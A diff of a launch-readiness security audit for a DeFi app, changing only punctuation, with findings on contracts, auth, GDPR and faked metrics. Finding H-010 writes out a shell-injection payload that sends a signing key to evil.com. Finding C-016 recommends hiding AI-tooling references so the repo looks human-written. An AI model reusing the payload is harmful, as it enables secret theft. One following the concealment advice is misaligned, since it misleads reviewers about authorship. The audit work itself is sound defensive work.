@@ -1,21 +1,21 @@
-# Atrium Full Launch-Readiness Audit — 2026-05-28
+# Atrium Full Launch-Readiness Audit, 2026-05-28
 
 This is the consolidated launch-readiness audit. It supersedes every prior audit doc for the 2026-05-28 cycle. It is the single source of truth for what is broken, what is faked, what is missing, and what is good.
 
 ## Method
 
-- **Wave 0** — original 10-subagent first pass. 69 findings. Preserved here as `O-N`.
-- **Wave 1** — 5 parallel subagents on web security, live verification, accessibility/perf/SEO, wallet/tx/network UX, launch-readiness/legal/brand. 179 findings.
-- **Wave 2** — 5 parallel subagents on PRD-vs-built fit, resources/ cross-reference, contracts deep re-review, subgraph reliability, end-to-end user journeys. 219 findings.
+- **Wave 0**, original 10-subagent first pass. 69 findings. Preserved here as `O-N`.
+- **Wave 1**, 5 parallel subagents on web security, live verification, accessibility/perf/SEO, wallet/tx/network UX, launch-readiness/legal/brand. 179 findings.
+- **Wave 2**, 5 parallel subagents on PRD-vs-built fit, resources/ cross-reference, contracts deep re-review, subgraph reliability, end-to-end user journeys. 219 findings.
 - **Total raw:** 467 findings. **Deduplicated unique:** 312 actionable items + 28 PASS confirmations.
 
 ## Coverage
 
-- `apps/verify/*` — 42 page routes, 200+ components, 45+ API routes, mobile + desktop trees.
-- `contracts/*` — 4 Stylus contracts (Plinth, Coffer, Sigil, Vigil), 25+ Solidity contracts (adapters, Aqueduct family, Postern family, registries, timelock).
-- `services/*` — codex, lantern-attestor, vigil-keeper, notifier, tablet, agents, archive, praetor-cli.
-- `subgraph/*` — schema.graphql, 15 handler files, 15 ABIs.
-- `.github/workflows/*` — all 9 workflows.
+- `apps/verify/*`, 42 page routes, 200+ components, 45+ API routes, mobile + desktop trees.
+- `contracts/*`, 4 Stylus contracts (Plinth, Coffer, Sigil, Vigil), 25+ Solidity contracts (adapters, Aqueduct family, Postern family, registries, timelock).
+- `services/*`, codex, lantern-attestor, vigil-keeper, notifier, tablet, agents, archive, praetor-cli.
+- `subgraph/*`, schema.graphql, 15 handler files, 15 ABIs.
+- `.github/workflows/*`, all 9 workflows.
 - `docs/*`, README, SECURITY, CONTRIBUTING, runbooks, incidents, audits, rehearsals.
 - `design/*` HTML prototypes + extracted tokens.
 - `resources/*` reference repos cross-checked: stylus-sdk-rs, rust-contracts-stylus, openzeppelin-contracts, aave-v3-core, pendle-core-v2-public, hyperliquid-contracts, hyper-evm-sync, chainlink-brownie-contracts, pyth-crosschain, account-abstraction, erc-8004-contracts, x402, graph-tooling, halmos, arbitrum-docs, arbitrum-sdk.
@@ -55,27 +55,27 @@ CLAUDE.md (no compromise; the design HTML is the product UI contract; best produ
 - All numeric formatting is BigInt-native; no precision loss in money math.
 - Onboarding correctly discloses unwired contracts as "pending" with named blockers.
 
-**Brutal one-paragraph verdict:** Atrium has the bones of a serious cross-venue prime brokerage product on Arbitrum Sepolia. The Stylus core, Solidity adapters, formal-verification scaffolding, and design system are real, deliberate, and audit-defensible. The frontend is two codebases stapled together — a solid API-driven implementation alongside an unscrubbed Lovable-port set of mocks that lie about TVL, agents, partners, and reserves. The honesty page itself lies. Five of the seven verifier-demo steps work; two are critical (deposit, kill switch), and the other three (open, recompute, liquidate) throw. Two web-security gaps (no CSP, no global error boundary), two GDPR gaps (Sentry without consent, templated privacy policy), and one notifier service that cannot deliver any alert because of two separate field-name mismatches stand between this product and a clean public demo. None of these are deep architectural problems. Most are surface-level fixes that a focused 5–10 day sprint can clear. The deeper items — Stylus contracts not in the deployment.md status table, agents that are stubs, adapter conformance tests that do not exist, status page absent — are real but tractable. The product is one disciplined sprint away from being legitimately launch-ready.
+**Brutal one-paragraph verdict:** Atrium has the bones of a serious cross-venue prime brokerage product on Arbitrum Sepolia. The Stylus core, Solidity adapters, formal-verification scaffolding, and design system are real, deliberate, and audit-defensible. The frontend is two codebases stapled together, a solid API-driven implementation alongside an unscrubbed Lovable-port set of mocks that lie about TVL, agents, partners, and reserves. The honesty page itself lies. Five of the seven verifier-demo steps work; two are critical (deposit, kill switch), and the other three (open, recompute, liquidate) throw. Two web-security gaps (no CSP, no global error boundary), two GDPR gaps (Sentry without consent, templated privacy policy), and one notifier service that cannot deliver any alert because of two separate field-name mismatches stand between this product and a clean public demo. None of these are deep architectural problems. Most are surface-level fixes that a focused 5–10 day sprint can clear. The deeper items, Stylus contracts not in the deployment.md status table, agents that are stubs, adapter conformance tests that do not exist, status page absent, are real but tractable. The product is one disciplined sprint away from being legitimately launch-ready.
 
 ---
 
 ## Severity ladder (definitions)
 
-- **🔴 CRITICAL** — fix before any public demo. Either a security exposure, a fabrication a judge will catch, or a flow that is fundamentally broken.
-- **🟠 HIGH** — fix before testnet submission. Real bug, real legal/regulatory gap, or real UX dead-end on a primary path.
-- **🟡 MEDIUM** — fix before mainnet flip / before serious-product launch. Quality, polish, completeness, professionalism.
-- **🟢 LOW** — nice to fix. Inconsistency, minor convenience, micro-optimization.
-- **✅ PASS** — verified correct; do not regress.
+- **🔴 CRITICAL**, fix before any public demo. Either a security exposure, a fabrication a judge will catch, or a flow that is fundamentally broken.
+- **🟠 HIGH**, fix before testnet submission. Real bug, real legal/regulatory gap, or real UX dead-end on a primary path.
+- **🟡 MEDIUM**, fix before mainnet flip / before serious-product launch. Quality, polish, completeness, professionalism.
+- **🟢 LOW**, nice to fix. Inconsistency, minor convenience, micro-optimization.
+- **✅ PASS**, verified correct; do not regress.
 
 Each finding shows: source audit reference, file/line evidence, root cause, impact, recommended fix, effort estimate (S = under 1h, M = 1–8h, L = >8h).
 
 ---
 
-# 🔴 CRITICAL — fix before any public demo
+# 🔴 CRITICAL, fix before any public demo
 
 ### C-001 · Desktop landing renders fabricated TVL/agents/queries via `Numbers.tsx`
 **Area:** Frontend / Honesty · **Source:** wave1-live-verify LV-04, wave1-launch L-3, wave2-product P-1
-**Evidence:** `apps/verify/src/components/atrium/landing/Numbers.tsx:9-10` — `useState(4.13)` for TVL, `useState(42109)` for queries, `const agents = 37`, plus a `setInterval` that randomly increments these to simulate a live counter.
+**Evidence:** `apps/verify/src/components/atrium/landing/Numbers.tsx:9-10`, `useState(4.13)` for TVL, `useState(42109)` for queries, `const agents = 37`, plus a `setInterval` that randomly increments these to simulate a live counter.
 **Root cause:** Lovable-port component imported on desktop landing alongside the honest `NumbersSection` (which fetches `/api/protocol/metrics`).
 **Impact:** Direct violation of CLAUDE.md ("Never ship the prototype numbers as truth") and `writing.md` claims discipline. Investors and judges see fabricated metrics on the primary marketing page.
 **Fix:** Delete `Numbers.tsx`. Replace the import with `NumbersSection`. The desktop landing page already has the honest component path wired.
@@ -99,7 +99,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-003 · Honesty page falsely claims the mobile fake numbers were removed
 **Area:** Frontend / Honesty · **Source:** wave1-live-verify LV-19, wave2-product P-15, wave2-e2e E2E-24
-**Evidence:** `apps/verify/src/app/docs/honesty/page.tsx:113` — "Per the 2026-05-25 audit, the mobile-landing was previously flashing `$12.37M` / `$4.13M` etc. before hydration; that has been removed." `MobileLanding.tsx` still has every one of those values.
+**Evidence:** `apps/verify/src/app/docs/honesty/page.tsx:113`, "Per the 2026-05-25 audit, the mobile-landing was previously flashing `$12.37M` / `$4.13M` etc. before hydration; that has been removed." `MobileLanding.tsx` still has every one of those values.
 **Root cause:** Honesty disclosure was written aspirationally and never verified against the code.
 **Impact:** The one surface that is supposed to be the source of truth for what is real is itself dishonest. A judge cross-referencing kills credibility instantly.
 **Fix:** Either fix `MobileLanding.tsx` (then the disclosure becomes true), or update the disclosure to say the fake stats still exist with a timeline for removal.
@@ -107,7 +107,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-004 · Verifier-mode steps 2, 3, 5 throw on click
 **Area:** Verifier / Demo · **Source:** wave2-product P-4, wave2-e2e E2E-01, E2E-40
-**Evidence:** `apps/verify/src/components/verifier-step-runner.tsx:145-148` — `case 'plinth-open-position': case 'plinth-recompute-margin': case 'vigil-liquidate': throw new Error(config.pendingReason);`
+**Evidence:** `apps/verify/src/components/verifier-step-runner.tsx:145-148`, `case 'plinth-open-position': case 'plinth-recompute-margin': case 'vigil-liquidate': throw new Error(config.pendingReason);`
 **Root cause:** The action kinds for steps 2 (open position), 3 (margin recompute), 5 (liquidation drill) are not wired. The pending banner appears only when `deploymentReady === false`; if the user navigates directly to the step the throw fires.
 **Impact:** The 7-step verifier flow is the primary judge demo per PRD §26.1. Today only 4 of 7 steps walk. Acceptance-criteria gate #6 ("all 7 steps walk end-to-end") cannot pass. The judge runbook beat-by-beat description of "Two parallel positions. Long on Trade.xyz, short on Hyperliquid" is fiction.
 **Fix:** Either (a) wire the three action kinds via AtriumRouter + Plinth + Vigil and complete the demo, or (b) gate every step with a deployment-ready check that surfaces a clean honest-pending banner instead of throwing. Path (a) is the right fix; path (b) is the same-week mitigation.
@@ -115,7 +115,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-005 · `Aqueduct.resume()` is `onlyPraetor`, bypassing the 48-hour timelock
 **Area:** Contracts / Praetor · **Source:** O-13, wave2-contracts W2-C2
-**Evidence:** `contracts/aqueduct/src/Aqueduct.sol:143` — `function resume() external onlyPraetor`
+**Evidence:** `contracts/aqueduct/src/Aqueduct.sol:143`, `function resume() external onlyPraetor`
 **Root cause:** Sole contract whose `resume()` is multisig-only. Every other contract uses `onlyTimelock`.
 **Impact:** A compromised Praetor key (the deployer EOA today) can pause Aqueduct, drain via CCIP, then resume in one block. The timelock veto window that protects every other subsystem does not protect cross-chain transfers.
 **Fix:** Change to `onlyTimelock`. Redeploy or upgrade Aqueduct.
@@ -123,7 +123,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-006 · `PlinthMath.required_margin()` returns zero on array length mismatch instead of reverting
 **Area:** Contracts / Math · **Source:** O-3, wave2-contracts W2-C1
-**Evidence:** `contracts/plinth-math/src/lib.rs:62-71` — guard returns `U256::ZERO` instead of panicking. The Plinth wrapper's `map_err → ERR_MATH_UNREACHABLE` only catches a full staticcall revert, not a successful zero return.
+**Evidence:** `contracts/plinth-math/src/lib.rs:62-71`, guard returns `U256::ZERO` instead of panicking. The Plinth wrapper's `map_err → ERR_MATH_UNREACHABLE` only catches a full staticcall revert, not a successful zero return.
 **Root cause:** Defensive coding chose silent-zero over revert.
 **Impact:** If Plinth ever passes mismatched arrays (storage race during liquidation, malformed config), the user gets `required_margin = 0` → unlimited leverage until the next update.
 **Fix:** Replace the early-return with `panic!` or a `sol!`-defined revert. Plinth's existing error mapping then surfaces `ERR_MATH_UNREACHABLE` correctly.
@@ -137,12 +137,12 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 **Fix:** Rotate every secret in `.env` immediately. Generate new deployer EOA. Transfer admin via PraetorTimelock. Rotate Cloudflare token, Graph deploy key, all cron tokens. Move secrets to a vault (1Password, Bitwarden, HashiCorp Vault free tier). Check the boxes in the incident doc.
 **Effort:** L (full rotation + verify). Critical because already overdue.
 
-### C-008 · Notifier queries non-existent subgraph fields — every tick silently fails
+### C-008 · Notifier queries non-existent subgraph fields, every tick silently fails
 **Area:** Backend / Subgraph · **Source:** wave2-subgraph SD-1
-**Evidence:** `services/notifier/src/tick.ts:79-95` — GraphQL query requests `txHash` on `liquidationEvents`, `alertEvents`, and `sigilRevocations`. None of these entities define `txHash`. Also queries `detail` on `alertEvents` (not in schema) and `user` on `liquidationEvents` (the field is `account`, typed as a nullable FK, not a Bytes address).
+**Evidence:** `services/notifier/src/tick.ts:79-95`, GraphQL query requests `txHash` on `liquidationEvents`, `alertEvents`, and `sigilRevocations`. None of these entities define `txHash`. Also queries `detail` on `alertEvents` (not in schema) and `user` on `liquidationEvents` (the field is `account`, typed as a nullable FK, not a Bytes address).
 **Root cause:** Notifier was written against a planned schema shape that never shipped. No integration test validates the query against the live schema.
 **Impact:** Every tick's `gql()` returns a GraphQL error. The catch returns. Zero notifications ever deliver. Liquidation alerts, oracle disagreements, and mandate revocations are dead letter despite a 1-minute cron.
-**Fix:** Align query field names with the actual schema. For `txHash`, immutable entities use `id = txHash + '-' + logIndex` — extract it from the id, or add `txHash: Bytes!` to the relevant entities.
+**Fix:** Align query field names with the actual schema. For `txHash`, immutable entities use `id = txHash + '-' + logIndex`, extract it from the id, or add `txHash: Bytes!` to the relevant entities.
 **Effort:** M (2h)
 
 ### C-009 · Notifier `mapAlertKind` uses SCREAMING_SNAKE; handlers write lowercase
@@ -155,7 +155,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-010 · Sentry fires without consent or disclosure (GDPR violation)
 **Area:** Security / Legal · **Source:** wave1-websec F5, wave1-launch L-2
-**Evidence:** `apps/verify/sentry.client.config.ts:9` — `Sentry.init()` runs unconditionally on page load. `apps/verify/src/app/legal/privacy/page.tsx` mentions only "Vercel Web Analytics with cookie-free measurement" and never mentions Sentry.
+**Evidence:** `apps/verify/sentry.client.config.ts:9`, `Sentry.init()` runs unconditionally on page load. `apps/verify/src/app/legal/privacy/page.tsx` mentions only "Vercel Web Analytics with cookie-free measurement" and never mentions Sentry.
 **Root cause:** No consent banner. Sentry sets cookies + transmits device/browser fingerprint + URLs (which contain wallet addresses) to a US processor without prior consent.
 **Impact:** GDPR Article 6 + ePrivacy Directive violation for EU visitors. CCPA opt-out missing for US visitors. Fines up to 4% of turnover. Wallet addresses leaked to a third party as pseudonymous PII.
 **Fix:** Implement a minimal consent banner that gates Sentry init. Add Sentry to the privacy policy with sub-processor disclosure. Add a `beforeSend` PII scrubber that redacts `0x[a-f0-9]{40}` in error messages, URLs, breadcrumbs.
@@ -163,7 +163,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-011 · Sentry `replaysOnErrorSampleRate: 1.0` captures full DOM replay without consent
 **Area:** Security / Legal · **Source:** wave1-websec F22
-**Evidence:** `apps/verify/sentry.client.config.ts:18` — Session Replay records DOM mutations, mouse, keystrokes on every error. Combined with C-010, every error event captures the user's screen including wallet addresses and form input.
+**Evidence:** `apps/verify/sentry.client.config.ts:18`, Session Replay records DOM mutations, mouse, keystrokes on every error. Combined with C-010, every error event captures the user's screen including wallet addresses and form input.
 **Root cause:** Replay enabled at 1.0 sample with no consent gate.
 **Impact:** Full screen + interaction recording sent to Sentry on every JS error. Unambiguous GDPR data-processing violation.
 **Fix:** Set sample rate to 0 until consent is granted. Add `maskAllText: true` and `blockAllMedia: true` to the replay integration as defense-in-depth.
@@ -171,7 +171,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-012 · Privacy policy and terms are templated boilerplate, not finance-grade legal text
 **Area:** Legal / Compliance · **Source:** wave1-launch L-1, L-4
-**Evidence:** `apps/verify/src/app/legal/privacy/page.tsx` — discloses wallet data and Vercel analytics but omits: data retention periods (beyond Codex 24h), GDPR user rights (access, rectification, erasure, portability), CCPA opt-out, DPO contact, processing location, lawful basis, Sentry disclosure, sub-processor list. `apps/verify/src/app/legal/terms/page.tsx` — covers testnet-only and no-warranty but omits: governing law, dispute resolution, eligibility, excluded jurisdictions (OFAC), limitation of liability, indemnification, class-action waiver.
+**Evidence:** `apps/verify/src/app/legal/privacy/page.tsx`, discloses wallet data and Vercel analytics but omits: data retention periods (beyond Codex 24h), GDPR user rights (access, rectification, erasure, portability), CCPA opt-out, DPO contact, processing location, lawful basis, Sentry disclosure, sub-processor list. `apps/verify/src/app/legal/terms/page.tsx`, covers testnet-only and no-warranty but omits: governing law, dispute resolution, eligibility, excluded jurisdictions (OFAC), limitation of liability, indemnification, class-action waiver.
 **Root cause:** Pages were created to satisfy "do legal pages exist" without lawyer review.
 **Impact:** Non-compliant with GDPR Art. 13/14 and CCPA §1798.100. Terms unenforceable in most jurisdictions. For a finance product targeting UK/US/DE users (Tablet supports all three), this is a structural legal risk.
 **Fix:** Engage a privacy lawyer to draft a compliant privacy policy. Add governing law (Cayman/BVI/Delaware are common), arbitration clause, eligibility section referencing Edict tiers, limitation of liability. Until lawyer review lands, gate the app behind a click-through that says "testnet only, no real funds, you accept that you may lose access at any time."
@@ -179,7 +179,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-013 · Landing trust strip lists 8 unsigned partners (Pendle, Hyperliquid, Aave Labs, Coinbase, etc.)
 **Area:** Frontend / Honesty / Legal · **Source:** wave1-live-verify LV-06, wave2-product P-3
-**Evidence:** `apps/verify/src/lib/atrium/mock.ts:119` — `PARTNERS = ["Pendle Labs", "Variational", "Horizen", "IOSG", "Robinhood Chain", "Hyperliquid", "Aave Labs", "Coinbase"]`. Used in `page.tsx:280`. `docs/deployment.md` says "Cohort partner outreach (zero today)." Honesty page says "No partner logos render on the cohort strip."
+**Evidence:** `apps/verify/src/lib/atrium/mock.ts:119`, `PARTNERS = ["Pendle Labs", "Variational", "Horizen", "IOSG", "Robinhood Chain", "Hyperliquid", "Aave Labs", "Coinbase"]`. Used in `page.tsx:280`. `docs/deployment.md` says "Cohort partner outreach (zero today)." Honesty page says "No partner logos render on the cohort strip."
 **Root cause:** Prototype partner names carried over without consent verification.
 **Impact:** Direct violation of CLAUDE.md ("Never invent a number, partner, mentor, or relationship"). Judges who check `/cohort` (honest empty state) vs landing (8 logos) see a contradiction. Trademark / commercial-misrepresentation exposure if any named company objects.
 **Fix:** Replace the `PARTNERS` array with an empty array, fetch from `/api/cohort/partners` (which today returns empty), and show "Building on" with technology names (Arbitrum, Chainlink, ERC-4337) instead of company logos.
@@ -190,7 +190,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 **Evidence:** Kill switch surfaces:
 - `/verify/7` (works, deployment-gated)
 - Desktop topbar `AppShellActions` (works)
-- Mobile: nowhere. `SettingsMobile`, `AgentsMobile`, `MobileApp` Lovable port — none have a kill-switch row.
+- Mobile: nowhere. `SettingsMobile`, `AgentsMobile`, `MobileApp` Lovable port, none have a kill-switch row.
 
 `docs/conventions/ui.md` lists Kill Switch as one of the 5 required mobile flows.
 **Root cause:** Kill switch implemented as a desktop-topbar element; mobile pivot never added it.
@@ -208,7 +208,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-016 · `.gitignore` and `CONTRIBUTING.md` reveal AI tooling to public viewers
 **Area:** Docs / Professionalism · **Source:** O-5, O-6
-**Evidence:** `.gitignore` contains comments naming "CLAUDE.md", "AI-assistant working directory", "AI-assisted dev workflow". `CONTRIBUTING.md` (line 47, original) said "Never add Co-authored-by: Claude" — already partially addressed but verify the rephrase landed in `docs/conventions/git.md` too.
+**Evidence:** `.gitignore` contains comments naming "CLAUDE.md", "AI-assistant working directory", "AI-assisted dev workflow". `CONTRIBUTING.md` (line 47, original) said "Never add Co-authored-by: Claude", already partially addressed but verify the rephrase landed in `docs/conventions/git.md` too.
 **Root cause:** Comments written for internal team without considering public visibility.
 **Impact:** A judge or investor browsing the repo sees explicit AI-tooling references on a tracked file. Reduces perception of human authorship.
 **Fix:** Strip or genericize: replace "CLAUDE.md / AI assistant" comments with "internal tooling config." Verify `docs/conventions/git.md` uses generic phrasing.
@@ -219,7 +219,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 **Evidence:**
 - `docs/deployment.md:28-29` claims "Stylus contracts (Coffer, Plinth, Sigil, Vigil) | 0 / 4 | BLOCKED" and "Stylus-dependent Solidity (Aqueduct, Router, Postern, Rostrum) | 0 / 5 | Blocked".
 - `deployments/arbitrum_sepolia.json` has deployed addresses for all 9 (coffer, sigil, vigil, plinth, aqueduct, atrium-router, postern-kill-switch, rostrum, plus more).
-- `deployment.md:46` lists lantern-attestor as `0x900a9fb4bab7576fc11e4bb3c002d89dbe261168` — that's the v1 address marked DEPRECATED in the JSON. The v2 lantern is `0xF0B90b94C0B8a52c545768bFf06a3932c67d5888`.
+- `deployment.md:46` lists lantern-attestor as `0x900a9fb4bab7576fc11e4bb3c002d89dbe261168`, that's the v1 address marked DEPRECATED in the JSON. The v2 lantern is `0xF0B90b94C0B8a52c545768bFf06a3932c67d5888`.
 - `deployment.md` lists 7 contracts in its address table; the JSON has 30+.
 
 **Root cause:** Status table written before deploy and never updated.
@@ -237,7 +237,7 @@ Each finding shows: source audit reference, file/line evidence, root cause, impa
 
 ### C-019 · `docs/AUDIT_FINDINGS.md` referenced in `JUDGE_ONE_PAGER.md` and frontend; does not exist
 **Area:** Docs · **Source:** wave1-live-verify LV-10, LV-18
-**Evidence:** `JUDGE_ONE_PAGER.md:53` — "Build state below mirrors `docs/AUDIT_FINDINGS.md` (83 patches landed at Day -7)." The file is gitignored. Multiple frontend components reference it (`audit-findings-table.tsx`, `/api/audit-findings` route, /docs page). The API route returns 404 or empty.
+**Evidence:** `JUDGE_ONE_PAGER.md:53`, "Build state below mirrors `docs/AUDIT_FINDINGS.md` (83 patches landed at Day -7)." The file is gitignored. Multiple frontend components reference it (`audit-findings-table.tsx`, `/api/audit-findings` route, /docs page). The API route returns 404 or empty.
 **Root cause:** Same as C-018.
 **Impact:** A judge clicking through to verify the "94 patches landed" claim finds nothing. The JUDGE_ONE_PAGER's closing claim "no number on this page is invented" is undermined.
 **Fix:** Either publish the audit-findings doc (preferred) or remove all references from public files.
@@ -257,7 +257,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### C-021 · `subgraph-deploy.sh` reads from non-existent `deploy/arbitrum-sepolia.json`
 **Area:** Subgraph / Deploy · **Source:** wave2-subgraph SD-8
-**Evidence:** `scripts/subgraph-deploy.sh:37` — `DEPLOY_FILE="deploy/arbitrum-sepolia.json"`. The actual registry is at `deployments/arbitrum_sepolia.json` (different directory, different separator). Running the script exits immediately with "ERROR: deploy/arbitrum-sepolia.json not found."
+**Evidence:** `scripts/subgraph-deploy.sh:37`, `DEPLOY_FILE="deploy/arbitrum-sepolia.json"`. The actual registry is at `deployments/arbitrum_sepolia.json` (different directory, different separator). Running the script exits immediately with "ERROR: deploy/arbitrum-sepolia.json not found."
 **Root cause:** Bash script written against an earlier directory layout; never updated when the registry moved.
 **Impact:** The documented subgraph deploy path is broken. A deploy under time pressure (incident response, urgent schema fix) fails at the first step.
 **Fix:** Change `DEPLOY_FILE` to `deployments/arbitrum_sepolia.json`. Or replace the inline Python patcher with `node scripts/update-subgraph-addresses.mjs` (which already reads the correct path).
@@ -266,9 +266,9 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 ### C-022 · `loadtest-nightly.yml` and `ci.yml` (kani job) push directly to master
 **Area:** CI/CD / Security · **Source:** O-11 (loadtest), wave1-websec F12, F29, F30
 **Evidence:**
-- `.github/workflows/loadtest-nightly.yml:55-61` — `git push` directly to master from the workflow bot.
-- `.github/workflows/ci.yml:85,119` — kani job has `permissions: contents: write` and `git push || true` directly to main.
-- `.github/workflows/brand-assets.yml:26` — same pattern with auto-commit-action.
+- `.github/workflows/loadtest-nightly.yml:55-61`, `git push` directly to master from the workflow bot.
+- `.github/workflows/ci.yml:85,119`, kani job has `permissions: contents: write` and `git push || true` directly to main.
+- `.github/workflows/brand-assets.yml:26`, same pattern with auto-commit-action.
 
 **Root cause:** Commit-back patterns to bypass humans. `|| true` suppresses push failures silently.
 **Impact:** A compromised step (malicious cargo dep pulled during `cargo install kani-verifier`, malicious Python dep in loadtest, etc.) can push arbitrary code to main without review. Branch protection is bypassed.
@@ -277,13 +277,13 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### C-023 · Tablet tax service has zero authentication
 **Area:** Backend / Auth · **Source:** O-7, wave2-product P-10
-**Evidence:** `services/tablet/` (FastAPI) — no auth middleware. The `/api/tax/export` route on the verify-app proxies to it without auth.
+**Evidence:** `services/tablet/` (FastAPI), no auth middleware. The `/api/tax/export` route on the verify-app proxies to it without auth.
 **Root cause:** Demo wallet pattern; auth deferred.
 **Impact:** Anyone can export any wallet's tax data by passing `?wallet=`. Information disclosure of full financial history (positions, P&L, deposits, withdrawals) for any address.
 **Fix:** Add Bearer-token auth or SIWE session check. Same pattern the notifier uses. Until shipped, restrict `?wallet=` to `DEMO_WALLET_ADDRESS` env fallback only.
 **Effort:** M (4h)
 
-### C-024 · Notifier `customWebhookUrl` SSRF — no URL validation
+### C-024 · Notifier `customWebhookUrl` SSRF, no URL validation
 **Area:** Backend / Security · **Source:** O-8
 **Evidence:** Notifier `services/notifier/src/tick.ts` (and `/api/settings/notifications` route) accepts a user-supplied `customWebhookUrl` with no URL validation.
 **Root cause:** No validation layer.
@@ -293,7 +293,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### C-025 · Chaos `inject` route accepts any `*.vercel.app` origin
 **Area:** Backend / Security · **Source:** wave1-websec F6
-**Evidence:** `apps/verify/src/app/api/chaos/inject/route.ts:85` — `if (origin.endsWith('.vercel.app')) return true;`
+**Evidence:** `apps/verify/src/app/api/chaos/inject/route.ts:85`, `if (origin.endsWith('.vercel.app')) return true;`
 **Root cause:** Wildcard match intended for Atrium preview deploys also matches any other Vercel project.
 **Impact:** An attacker deploys a malicious page on their own Vercel project (e.g. `evil-xyz.vercel.app`), and the browser fetch succeeds origin-check. They can pause Plinth on Sepolia. Per-IP rate limit slows but does not prevent.
 **Fix:** Replace wildcard with project-scoped prefix: `^https:\/\/atrium-verify-[a-z0-9]+-[a-z0-9-]+\.vercel\.app$` plus `*.atrium.fi`. Or read an env var `ALLOWED_PREVIEW_PREFIX`.
@@ -303,7 +303,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 
 
-# 🟠 HIGH — fix before testnet submission
+# 🟠 HIGH, fix before testnet submission
 
 ## Security · HTTP / CSP / headers / auth
 
@@ -331,7 +331,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Fix:** Until SIWE session auth ships, scope the routes to `DEMO_WALLET_ADDRESS` env fallback only. Or require a Bearer token signed by the wallet (challenge-response).
 **Effort:** M (4–6h shipping SIWE; S 30min for demo-wallet-only mitigation)
 
-### H-005 · `connected-sites` route has no auth — anyone can POST/DELETE sessions
+### H-005 · `connected-sites` route has no auth, anyone can POST/DELETE sessions
 **Source:** wave1-websec F18 · **File:** `apps/verify/src/app/api/settings/connected-sites/route.ts`
 **Impact:** Any visitor can register fake connected-dapp entries (UI confusion) or DELETE all (denial of service). The in-memory Map is shared across callers.
 **Fix:** Apply the same `requireBearer` pattern used by `settings/notifications`.
@@ -364,7 +364,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 ### H-010 · `archive-weekly.yml` shell injection via `workflow_dispatch` input
 **Source:** O-48, wave1-websec F20 · **File:** `.github/workflows/archive-weekly.yml:42`
 **Evidence:** `--strategy "${{ github.event.inputs.strategy || 'mean-reversion-v1' }}"` interpolates user input directly into shell.
-**Impact:** A repo collaborator dispatches the workflow with payload like `mean-reversion-v1"; curl evil.com/x?t=$RESEARCH_SIGNER_KEY #` — exfiltrates secrets.
+**Impact:** A repo collaborator dispatches the workflow with payload like `mean-reversion-v1"; curl evil.com/x?t=$RESEARCH_SIGNER_KEY #`, exfiltrates secrets.
 **Fix:** Pass via env var instead of inline interpolation: `env: { STRATEGY: ${{ github.event.inputs.strategy }} }` then `--strategy "$STRATEGY"`.
 **Effort:** S (5 min)
 
@@ -407,7 +407,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ## Security · oracle / contracts / CCIP
 
-### H-017 · Oracle `abs_diff_bps` is asymmetric — same disagreement passes or fails depending on which oracle is higher
+### H-017 · Oracle `abs_diff_bps` is asymmetric, same disagreement passes or fails depending on which oracle is higher
 **Source:** wave2-contracts W2-H2 · **File:** `contracts/plinth-oracle/src/lib.rs:138-144`
 **Evidence:** Always divides by `a` (Chainlink). At a 5% disagreement, diff_bps is 500 if Chainlink is lower but 476 if Chainlink is higher.
 **Impact:** At the 50bps boundary, identical disagreement passes or fails depending on ordering. Spurious `OracleDisagreement` reverts blocking user ops, OR slightly-stale prices through.
@@ -435,7 +435,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 ### H-021 · `AqueductReceiver` does NOT inherit `IERC165.supportsInterface`
 **Source:** wave2-resources 6.1 · **File:** `contracts/aqueduct/src/AqueductReceiver.sol:47`
 **Evidence:** Defines its own `CCIPReceiverBase` abstract contract inline. Chainlink's `CCIPReceiver.sol` implements `IERC165.supportsInterface` returning true for `IAny2EVMMessageReceiver`. CCIP router checks `supportsInterface` before calling `ccipReceive`. Without it, only tokens transfer (no data execution).
-**Impact:** Cross-chain messages may silently drop on production CCIP routers — user's USDC arrives but the deposit-into-Coffer logic never runs.
+**Impact:** Cross-chain messages may silently drop on production CCIP routers, user's USDC arrives but the deposit-into-Coffer logic never runs.
 **Fix:** Inherit from `CCIPReceiver` upstream OR implement `supportsInterface(IAny2EVMMessageReceiver.interfaceId) returns true`.
 **Effort:** S (10 min) + redeploy
 
@@ -468,7 +468,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-026 · `PosternKeyRegistry.markAllRevoked` iterates unbounded array → kill switch can fail
 **Source:** wave2-contracts W2-H6 · **File:** `contracts/postern-kill-switch/src/PosternKeyRegistry.sol:52-58`
-**Impact:** No cap on `_activeKeys[user].length`. An attacker can spam `recordIssued` to grow the array until `markAllRevoked` exceeds block gas. The Kill Switch's `try { keyRegistry.markAllRevoked(user) }` catches the OOG, but `keys_cancelled = 0` — session keys persist after the user thought they killed everything.
+**Impact:** No cap on `_activeKeys[user].length`. An attacker can spam `recordIssued` to grow the array until `markAllRevoked` exceeds block gas. The Kill Switch's `try { keyRegistry.markAllRevoked(user) }` catches the OOG, but `keys_cancelled = 0`, session keys persist after the user thought they killed everything.
